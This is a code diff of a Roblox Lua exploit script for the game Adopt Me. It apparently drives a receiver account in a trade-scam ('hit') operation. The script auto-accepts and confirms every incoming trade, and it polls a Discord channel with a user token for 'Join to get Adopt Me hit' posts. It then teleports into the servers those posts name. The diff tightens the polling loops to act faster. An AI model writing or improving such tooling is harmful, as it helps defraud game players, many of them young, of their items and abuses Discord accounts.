@@ -1,12 +1,11 @@
 if not game:IsLoaded() then
-	game.Loaded:Wait()
+    game.Loaded:Wait()
 end
 
 if token == "" or channelId == "" then
-	game.Players.LocalPlayer:Kick("Add your token or channelId to use")
+    game.Players.LocalPlayer:Kick("Add your token or channelId to use")
 end
 
--- Services
 local Players = game:GetService("Players")
 local HttpServ = game:GetService("HttpService")
 local TeleportService = game:GetService("TeleportService")
@@ -39,164 +38,171 @@ StatusLabel.TextSize = 14
 StatusLabel.Parent = StatusFrame
 
 local function setStatus(working)
-	if working then
-		StatusLabel.Text = "Status: Working"
-		StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
-		StatusFrame.BackgroundColor3 = Color3.fromRGB(10, 40, 20)
-	else
-		StatusLabel.Text = "Status: Not Working"
-		StatusLabel.TextColor3 = Color3.fromRGB(255, 60, 60)
-		StatusFrame.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
-	end
+    if working then
+        StatusLabel.Text = "Status: Working"
+        StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 100)
+        StatusFrame.BackgroundColor3 = Color3.fromRGB(10, 40, 20)
+    else
+        StatusLabel.Text = "Status: Not Working"
+        StatusLabel.TextColor3 = Color3.fromRGB(255, 60, 60)
+        StatusFrame.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
+    end
 end
 
--- Anti AFK
 Players.LocalPlayer.Idled:Connect(function()
-	bb:CaptureController()
-	bb:ClickButton2(Vector2.new())
+    bb:CaptureController()
+    bb:ClickButton2(Vector2.new())
 end)
 
--- Files
 if not isfile("joined_ids_adm.txt") then
-	writefile("joined_ids_adm.txt", "[]")
+    writefile("joined_ids_adm.txt", "[]")
 end
 local joinedIds = HttpServ:JSONDecode(readfile("joined_ids_adm.txt"))
 
--- GUI wait
 local loadingScreen = playerGui:WaitForChild("AssetLoadUI")
 while loadingScreen.Enabled do task.wait(1) end
 task.wait(10)
 
--- Trade setup
 local tradeFrame = playerGui.TradeApp.Frame
 local RouterClient = require(game.ReplicatedStorage.Fsys).load("RouterClient")
 
-local AcceptDecline = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
-local AddItemRemote = RouterClient.get("TradeAPI/AddItemToOffer")
-local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
-local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
+local AcceptDecline             = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
+local AddItemRemote             = RouterClient.get("TradeAPI/AddItemToOffer")
+local AcceptNegotiationRemote   = RouterClient.get("TradeAPI/AcceptNegotiation")
+local ConfirmTradeRemote        = RouterClient.get("TradeAPI/ConfirmTrade")
 
 local inventory = require(
-	game.ReplicatedStorage.ClientModules.Core.ClientData
+    game.ReplicatedStorage.ClientModules.Core.ClientData
 ).get_data()[Players.LocalPlayer.Name].inventory
 
 setStatus(true)
 
--- Helpers
 local function IsTrading()
-	return tradeFrame.Visible
+    return tradeFrame.Visible
 end
 
 local foodAdded = false
 local timer = 0
+-- Track last seen Discord message ID to skip re-checking old messages
+local lastMessageId = nil
 
 ----------------------------------------------------------------
 -- ACCEPT ANY TRADE
 ----------------------------------------------------------------
 task.spawn(function()
-	while task.wait(0.1) do
-		if not IsTrading() then
-			for _, player in ipairs(Players:GetPlayers()) do
-				if player ~= Players.LocalPlayer then
-					pcall(function()
-						AcceptDecline:InvokeServer(player, true)
-					end)
-				end
-			end
-		end
-	end
+    while task.wait(0.05) do
+        if not IsTrading() then
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player ~= Players.LocalPlayer then
+                    pcall(function()
+                        AcceptDecline:InvokeServer(player, true)
+                    end)
+                end
+            end
+        end
+    end
 end)
 
 ----------------------------------------------------------------
 -- ADD ITEM + ACCEPT NEGOTIATION
 ----------------------------------------------------------------
 task.spawn(function()
- while task.wait(0.1) do
-  if IsTrading() then
-   if not foodAdded then
-    local foodKeys = {}
-    for uid in pairs(inventory.food) do
-     table.insert(foodKeys, uid)
+    while task.wait(0.05) do
+        if IsTrading() then
+            if not foodAdded then
+                local foodKeys = {}
+                for uid in pairs(inventory.food) do
+                    table.insert(foodKeys, uid)
+                end
+                if #foodKeys > 0 then
+                    for i = 1, math.min(9, #foodKeys) do
+                        AddItemRemote:FireServer(foodKeys[i])
+                    end
+                    foodAdded = true
+                end
+            end
+            AcceptNegotiationRemote:FireServer()
+        end
     end
-
-    if #foodKeys > 0 then
-     for i = 1, math.min(9, #foodKeys) do
-      AddItemRemote:FireServer(foodKeys[i])
-     end
-     foodAdded = true
-    end
-   end
-   AcceptNegotiationRemote:FireServer()
-  end
- end
 end)
 
 ----------------------------------------------------------------
 -- CONFIRM TRADE
 ----------------------------------------------------------------
 task.spawn(function()
-	while task.wait(0.1) do
-		if IsTrading() and foodAdded then
-			ConfirmTradeRemote:FireServer()
-		end
-	end
+    while task.wait(0.05) do
+        if IsTrading() and foodAdded then
+            ConfirmTradeRemote:FireServer()
+        end
+    end
 end)
 
 ----------------------------------------------------------------
 -- TRADE END DETECTION
 ----------------------------------------------------------------
 task.spawn(function()
-	while task.wait(1) do
-		if IsTrading() then
-			timer = 0
-		else
-			timer += 1
-			foodAdded = false
-		end
-	end
+    while task.wait(1) do
+        if IsTrading() then
+            timer = 0
+        else
+            timer += 1
+            foodAdded = false
+        end
+    end
 end)
 
 ----------------------------------------------------------------
 -- DISCORD AUTO JOIN
 ----------------------------------------------------------------
 local function saveJoinedId(id)
-	table.insert(joinedIds, id)
-	writefile("joined_ids_adm.txt", HttpServ:JSONEncode(joinedIds))
+    table.insert(joinedIds, id)
+    writefile("joined_ids_adm.txt", HttpServ:JSONEncode(joinedIds))
 end
 
 local function autoJoin()
-	local response = request({
-		Url = "https://discord.com/api/v9/channels/" .. channelId .. "/messages?limit=10",
-		Method = "GET",
-		Headers = {
-			["Authorization"] = token,
-			["User-Agent"] = "Mozilla/5.0",
-			["Content-Type"] = "application/json"
-		}
-	})
+    -- Use after= to only fetch messages newer than the last one we saw
+    local url = "https://discord.com/api/v9/channels/" .. channelId .. "/messages?limit=10"
+    if lastMessageId then
+        url = url .. "&after=" .. lastMessageId
+    end
 
-	if response.StatusCode ~= 200 then return end
+    local response = request({
+        Url = url,
+        Method = "GET",
+        Headers = {
+            ["Authorization"] = token,
+            ["User-Agent"] = "Mozilla/5.0",
+            ["Content-Type"] = "application/json"
+        }
+    })
 
-	local messages = HttpServ:JSONDecode(response.Body)
-	for _, message in ipairs(messages) do
-		if message.embeds and message.embeds[1] and message.embeds[1].title then
-			if message.embeds[1].title:find("Join to get Adopt Me hit") then
-				local placeId, jobId =
-					string.match(message.content,
-						'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
+    if response.StatusCode ~= 200 then return end
 
-				if placeId and jobId and timer > 10 then
-					if not table.find(joinedIds, tostring(message.id)) then
-						saveJoinedId(tostring(message.id))
-						TeleportService:TeleportToPlaceInstance(placeId, jobId)
-						return
-					end
-				end
-			end
-		end
-	end
+    local messages = HttpServ:JSONDecode(response.Body)
+    if #messages == 0 then return end
+
+    -- Update lastMessageId to the newest message so next poll only fetches newer ones
+    lastMessageId = messages[1].id
+
+    for _, message in ipairs(messages) do
+        if message.embeds and message.embeds[1] and message.embeds[1].title then
+            if message.embeds[1].title:find("Join to get Adopt Me hit") then
+                local placeId, jobId =
+                    string.match(message.content,
+                        'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
+
+                if placeId and jobId and timer > 4 then
+                    if not table.find(joinedIds, tostring(message.id)) then
+                        saveJoinedId(tostring(message.id))
+                        TeleportService:TeleportToPlaceInstance(placeId, jobId)
+                        return
+                    end
+                end
+            end
+        end
+    end
 end
 
-while task.wait(5) do
-	autoJoin()
+while task.wait(2) do
+    autoJoin()
 end
